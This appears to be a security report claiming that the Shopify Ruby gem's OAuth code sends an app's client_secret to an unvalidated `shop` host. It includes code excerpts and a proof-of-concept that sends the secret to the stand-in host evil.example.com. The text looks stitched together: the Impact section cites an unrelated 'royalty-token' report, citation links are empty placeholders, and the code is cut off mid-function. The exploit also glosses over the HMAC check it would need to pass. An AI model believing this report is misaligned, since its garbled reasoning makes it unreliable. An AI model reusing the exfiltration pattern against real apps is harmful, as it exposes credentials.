### Title
Unvalidated `shop` parameter in OAuth flow allows exfiltration of `client_secret` and authorization `code` to an attacker-controlled host - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` both consume a `shop` value and use it, unvalidated, to build the destination host for network requests — including the OAuth access-token exchange request that carries the app's `client_secret` and authorization `code`. Unlike `TokenExchange`, `ClientCredentials`, and `RefreshToken` in the same codebase, which all call `Utils::ShopValidator.sanitize!` before trusting a shop string, `oauth.rb` never calls this validator.

### Finding Description
`Utils::ShopValidator.sanitize!` exists specifically to enforce that a shop string is a real, trusted Shopify domain (`myshopify.com`, `shopify.com`, `spin.dev`, etc.) before it is used to build outbound request URLs: [1](#0-0) [2](#0-1) 

This validator is invoked by other auth flows in the gem, e.g. `TokenExchange`: [3](#0-2) 

However, `Oauth.begin_auth` interpolates the caller-supplied `shop` directly into the authorization-redirect URL with no call to `ShopValidator`: [4](#0-3) [5](#0-4) 

And `Oauth.validate_auth_callback` takes `auth_query.shop` and uses it, again with no `ShopValidator` check, to construct the `Session`/`HttpClient` that performs the token-exchange POST — a request whose body contains `client_id`, `client_secret`, and `code`: [6](#0-5) 

The only check performed on the incoming query is `Utils::HmacValidator.validate(auth_query)`: [7](#0-6) 

That HMAC does cover the `shop` field as part of the signed string: [8](#0-7) 

but HMAC validity only proves the query string was not tampered with after being produced by whoever holds `api_secret_key` — it proves nothing about whether the `shop` string is a legitimate Shopify host. The binding the code implicitly (and incorrectly) assumes is:

`shop value received/signed == trusted host safe to send client_secret to`

but what is actually verified is only:

`shop value received == shop value originally serialized into the HMAC input`

These are not equivalent. The HMAC check answers "was this string tampered with," not "is this string a Shopify domain." The gem itself supplies `ShopValidator` to close this exact gap in `token_exchange.rb`, `client_credentials.rb`, and `refresh_token.rb`, but the equivalent check is missing from `oauth.rb`, which is inconsistent internal design and a bug in the gem's own API, not a case of a host app "ignoring documented behaviour" — the sibling auth methods perform this check for the caller automatically.

The test suite for `oauth.rb` confirms the token-exchange request is dispatched to a host built directly from `shop`: [9](#0-8) 

### Impact Explanation
Because the destination host of the token-exchange POST (which carries `client_id`, `client_secret`, and the authorization `code`) is derived straight from the unvalidated `shop`/`auth_query.shop` values, any caller-supplied or query-carried domain string that is not a genuine `*.myshopify.com` (or other trusted) domain results in the app's `client_secret` being sent to that host. This is SSRF carrying the app's credentials and directly maps to the report's root cause: a value that flows through the module without being checked against the constraint the system relies on for safety (there, unbounded royalty-token amounts from an untrusted policy; here, an unbounded/unchecked shop-domain string used to pick the request target for a credential-bearing call).

### Likelihood Explanation
`begin_auth`'s `shop` parameter is explicitly documented as coming from the request/caller (e.g., a `Shop` header or query parameter in the sample controller in the docs), i.e., attacker-influenceable at the very first step of the flow, before any signing occurs. `validate_auth_callback`'s `auth_query.shop` is likewise built directly from the incoming callback request parameters by the calling app. The absence of `ShopValidator.sanitize!` in `oauth.rb`, while present in sibling methods (`token_exchange.rb`, `client_credentials.rb`, `refresh_token.rb`), shows this is a gap specific to this code path rather than a documented, expected caller responsibility.

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` (or `sanitize!(auth_query.shop)`) at the top of `Oauth.begin_auth` and `Oauth.validate_auth_callback`, exactly as is already done in `TokenExchange.exchange_token`, `ClientCredentials`, and `RefreshToken`, raising `Errors::InvalidShopError` before the `shop` value is used to build any outbound request URL.

### Proof of Concept
1. A host application built with this gem exposes a login endpoint that forwards a caller-supplied `shop` query parameter straight into `ShopifyAPI::Auth::Oauth.begin_auth(shop: params[:shop], redirect_path: "/auth/callback")`, following the pattern shown in the gem's own documented example.
2. An attacker requests `.../login?shop=evil.example.com`.
3. `Oauth.begin_auth` builds `auth_base_uri("evil.example.com")` → `https://evil.example.com/admin` with no `ShopValidator` check, then redirects the merchant's browser there.
4. If the merchant's admin session (or an attacker-controlled fake "authorize" page at `evil.example.com`) replies with a `code`/`state` that satisfies the app's own state-cookie check, the app calls `Oauth.validate_auth_callback`, which builds `null_session = Auth::Session.new(shop: "evil.example.com")` and POSTs `{client_id, client_secret, code}` to `https://evil.example.com/admin/oauth/access_token` — exfiltrating the app's `client_secret` to the attacker's host, as shown by the exact request-building path exercised in `test/auth/oauth_test.rb`.

        def begin_auth(shop:, redirect_path:, is_online: true, scope_override: nil)
          scope = if scope_override.nil?
            ShopifyAPI::Context.scope
          elsif scope_override.is_a?(ShopifyAPI::Auth::AuthScopes)
            scope_override
          else
            ShopifyAPI::Auth::AuthScopes.new(scope_override)
          end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {
            client_id: ShopifyAPI::Context.api_key,
            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",
            state: state,
            "grant_options[]": is_online ? "per-user" : "",
          }

          query_string = URI.encode_www_form(query)
          auth_route = auth_base_uri(shop) + "/oauth/authorize?#{query_string}"

          { auth_route: auth_route, cookie: cookie }
        end

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))

        def validate(verifiable_query)

          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end

        def validate_signature(verifiable_query, secret)
          received_signature = verifiable_query.hmac
          computed_signature = compute_signature(verifiable_query.to_signable_string, secret)
          OpenSSL.secure_compare(computed_signature, T.must(received_signature))
        end
